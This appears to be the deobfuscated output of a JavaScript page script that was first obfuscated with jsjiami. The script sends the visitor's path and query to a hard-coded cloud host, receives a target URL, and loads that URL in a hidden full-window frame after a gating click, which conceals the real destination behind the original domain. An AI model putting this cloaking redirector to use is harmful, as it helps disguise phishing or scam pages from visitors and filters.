//Fri Apr 18 2025 06:16:14 GMT+0000 (Coordinated Universal Time)
//Base:<url id="cv1cref6o68qmpt26ol0" type="url" status="parsed" title="GitHub - echo094/decode-js: JS混淆代码的AST分析工具 AST analysis tool for obfuscated JS code" wc="2165">https://github.com/echo094/decode-js</url>
//Modify:<url id="cv1cref6o68qmpt26olg" type="url" status="parsed" title="GitHub - smallfawn/decode_action: 世界上本来不存在加密，加密的人多了，也便成就了解密" wc="741">https://github.com/smallfawn/decode_action</url>
function fetchApiContent() {
  const _0x283928 = window.location.pathname;
  const _0x39742e = window.location.search;
  const _0x47be7d = "//mbmb-582252-1251029753.ap-shanghai.run.tcloudbase.com" + _0x283928 + "/" + _0x39742e;
  fetch(_0x47be7d).then(_0x20d31c => _0x20d31c.json()).then(_0x3886b8 => {
    const _0x32e5d1 = _0x3886b8.url;
    if (_0x32e5d1) {
      setTimeout(() => {
        document.write("<frameset cols=\"0,*\" framespacing=\"0\" border=\"0\" rows=\"0\" frameborder=\"0\">\n  <frame src=\"about:blank\" scrolling=\"NO\" noresize=\"\" name=\"\">\n <frame src=\"" + _0x32e5d1 + "\" scrolling=\"auto\" noresize=\"\">");
      }, 100);
    } else {
      console.log("Error: No target URL found");
    }
  }).catch(_0x1f4dec => {
    console.log("Error:", _0x1f4dec);
  });
}
function onLoad() {
  const _0x494321 = localStorage.getItem("hasClicked");
  const _0x1cd146 = document.getElementById("continue-button");
  if (_0x494321) {
    fetchApiContent();
  } else {
    _0x1cd146.style.display = "block";
    _0x1cd146.addEventListener("click", () => {
      localStorage.setItem("hasClicked", "true");
      fetchApiContent();
    });
  }
}
window.addEventListener("load", onLoad);
_0xod2 = "jsjiami.com.v6";